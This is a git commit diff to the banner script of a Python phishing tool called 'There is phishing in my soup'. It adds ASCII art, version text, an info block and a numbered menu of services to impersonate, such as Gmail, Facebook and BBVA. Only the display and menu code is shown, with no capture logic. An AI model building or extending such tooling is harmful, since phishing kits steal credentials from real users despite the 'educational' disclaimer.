33bb5f9a8d4ac9f6da0639ab437c35585e6394c0
Neo TRAN <neo_tran@outlook.com>
2020-06-09 00:48:36 -0500

    Se ha agregado el banner de info

--- scripts/banner.py
+++ scripts/banner.py
@@ -6,7 +6,7 @@ BANNER = """
        /'_/\_ /_.   './     \033[89m╠═╣  ├─┘├─┤│└─┐├─┤│││││ ┬  \033[0m
       ;._ `/ ``      |      \033[89m╩ ╩  ┴  ┴ ┴┴└─┘┴ ┴┴┘└┘└─┘\033[0m
       |^ '-;._   _.' |          \033[0;38;5;172m╦ ┌┐┌  ┌┬┐┬ ┬  ╔═╗╔═╗╦ ╦╔═╗\033[0m
-      |^ ^  ||```    |          \033[89m║ │││  │││└┬┘  ╚═╗║ ║║ ║╠═╝\033[0m   \033[0;38;5;29mV: 0.1.0\033[0m
+      |^ ^  ||```    |          \033[89m║ │││  │││└┬┘  ╚═╗║ ║║ ║╠═╝\033[0m   \033[0;38;5;29mV: 0.1.2\033[0m
     .'| ^  ^||       |          \033[89m╩ ┘└┘  ┴ ┴ ┴   ╚═╝╚═╝╚═╝╩    \033[0m\033[0;38;5;29m     2020\033[0m
    `'`|^ ^ ^|\__,.--;'      \033[91m_________________ By Neo __________________\033[0m
       | ^ ^ | |     |       \033[94m[01]\033[0m Amino      \033[94m[08]\033[0m Instagram  \033[94m[15]\033[0m Twitter
@@ -17,11 +17,41 @@ BANNER = """
       / ..  |  |'- |        \033[94m[06]\033[0m Facebook   \033[94m[13]\033[0m Platzi     \033[94m[20]\033[0m Yahoo
       |/  `\|  |   |        \033[94m[07]\033[0m Gmail      \033[94m[14]\033[0m Reddit     \033[94m[21]\033[0m Zoom
                |   |
-              _|,__| \033[0;38;5;160mDisclaimer: The tool is for educational purposes,\033[0m
-             (_/  .' \033[0;38;5;160mwe are not responsible for the misuse that may occur\033[0m
-              (_.'
+              _|,__|        
+             (_/  .'   \033[0;38;5;160mDisclaimer: The tool is for educational purposes,\033[0m
+              (_.'     \033[0;38;5;160mwe are not responsible for the misuse that may occur.\033[0m
 """
 
-print(BANNER)
-print("Option: ", end="")
-input()
+
+INFO = """
+          \033[0;38;5;73m,-.        \033[0;38;5;112mLicence: MIT\033[0m
+      O  /   \033[0;38;5;73m`.      \033[0;38;5;112mAuthor: Neo TRAN\033[0m      ":"
+      <\/      \033[0;38;5;73m`.                      \033[0m  ___:____     |"\/"|
+       |*        \033[0;38;5;73m`.                    \033[0m,'        `.    \  /
+      / \          \033[0;38;5;73m`.                  \033[0m|  O        \___/  |
+     /  / \033[0;38;5;33m~^~^~^~^~^~\033[0;38;5;73m`>')3s,\033[0;38;5;33m~^~^~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^~^~^~^~\033[0m
+--------. \033[0;38;5;33m'.   ~   -    \033[0;38;5;73m` ,'\033[0;38;5;33m  ~`  ´ ' ~   `o ~~`  ´ ' ~   `o ~\033[0m
+||||||||/ \033[0;38;5;33m~`    ~    `o ~\033[0;38;5;73m¿\033[0;38;5;33m   .  -    ^   ~~`  ´ ' ~   `o ~\033[0m
+          \033[0;38;5;33m~`    ~    `o ~'. ~   -  `  ~~`  ´ ' ~   `o ~~`  ´ ' ~  .-  ^  ~\033[0m
+   
+  \033[0;38;5;94mThere is phishing in my soup, it is a tool created with python3 using 
+  the flask for the web server, and click to receive flags by terminal.
+  With an academic objective, the creator of the software is not responsible
+  for the misuse that may be given.
+
+  \033[0;38;5;112mGithub: https://github.com/NeoTRAN001/ThereIsAPhishingInMySoup\033[0m
+
+"""
+
+OPTIONS = ['Help','Amino', 'BBVA', 'Chess', 'Disney', 'EpicGames', 'Facebook', 'Gmail']
+
+def option():
+  try:
+    print(BANNER)
+    op = int(input("Option: "))
+    return OPTIONS[op]
+  except:
+    return None
+
+def info():
+  print(INFO)
